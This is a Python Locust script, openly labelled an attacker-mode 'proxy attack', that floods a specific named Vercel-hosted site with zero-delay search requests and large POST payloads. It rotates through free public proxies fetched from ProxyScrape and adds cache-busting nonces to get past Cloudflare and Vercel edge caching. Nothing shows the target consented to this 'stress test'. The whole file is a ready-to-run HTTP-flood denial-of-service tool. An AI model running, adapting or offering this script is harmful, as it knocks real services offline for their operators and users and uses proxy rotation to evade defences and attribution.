# locustfile_proxied_attack.py
# Attacker-mode Locust script: rotate through HTTP proxies from ProxyScrape to stress CF+Vercel edge 🚨

from gevent import monkey
monkey.patch_all()

import gc, uuid, random, requests
from locust import HttpUser, TaskSet, task, events, constant

# Disable Python GC to avoid pauses under heavy load
gc.disable()

# Fetch a fresh list of HTTP proxies from ProxyScrape
def fetch_proxies():
    url = (
        "https://api.proxyscrape.com/v2/?request=getproxies"
        "&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all"
    )
    try:
        resp = requests.get(url, timeout=10)
        resp.raise_for_status()
        proxies = [line.strip() for line in resp.text.splitlines() if line.strip()]
        print(f"[ChaosMonkey] Loaded {len(proxies)} proxies from ProxyScrape")
        return proxies
    except Exception as e:
        print(f"[ChaosMonkey] Failed to load proxies: {e}")
        return []

PROXIES = fetch_proxies()

class UserBehavior(TaskSet):
    def on_start(self):
        # Pick a random proxy for this user session
        if PROXIES:
            p = random.choice(PROXIES)
            proxy_url = f"http://{p}"
            self.proxies = {"http": proxy_url, "https": proxy_url}
        else:
            self.proxies = {}

    @task(7)
    def search(self):
        query = random.choice([
            "123456789012345678",
            "987654321098765432",
            "user_example",
            "ip:192.168.0.1",
        ])
        headers = {
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "X-Debug-Nonce": uuid.uuid4().hex,
        }
        path = f"/?q={query}&nocache={uuid.uuid4().hex}"
        # Rotate proxies via `proxies` param
        self.client.get(path, name="GET /?q", headers=headers, proxies=self.proxies)

    @task(3)
    def heavy_api(self):
        payload = {"data": "x" * random.randint(1000, 10000)}
        headers = {"Cache-Control": "no-cache"}
        self.client.post(
            "/api/process",
            json=payload,
            name="POST /api/process",
            headers=headers,
            proxies=self.proxies
        )

class WebsiteUser(HttpUser):
    host = "https://restorecord-leak-search.vercel.app"
    tasks = [UserBehavior]
    # No wait time – max spam
    wait_time = constant(0)

@events.test_start.add_listener
def on_test_start(environment, **kwargs):
    print("[ChaosMonkey] Proxy attack stress test started...")

@events.test_stop.add_listener
def on_test_stop(environment, **kwargs):
    print("[ChaosMonkey] Proxy attack complete.")
